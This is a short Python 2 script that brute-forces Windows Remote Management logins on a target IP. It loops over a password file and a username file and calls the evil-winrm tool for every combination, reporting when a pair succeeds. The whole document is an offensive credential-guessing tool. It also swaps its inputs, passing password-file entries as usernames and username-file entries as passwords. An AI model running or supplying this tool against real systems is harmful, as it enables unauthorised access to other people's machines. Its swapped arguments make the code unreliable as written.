#!/usr/bin/env python
import sys
import requests
import subprocess
#the 2 following import is for https, comment for http brute-force

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ip = raw_input("IP Address : ")

with open('passwords.txt') as f1:
	for line1 in f1:
		with open('usernames.txt') as f2:
			for line2 in f2:
				print "testing "+line1.rstrip()+":"+ line2.rstrip()
				r = subprocess.call(["/usr/bin/ruby", "/opt/evil-winrm/evil-winrm.rb",  "-i", ip, "-u", line1.rstrip(), "-p", line2.rstrip()])
				if r == 1:
					print "Not valid"
				else:
					print "Valid credentials found"
						
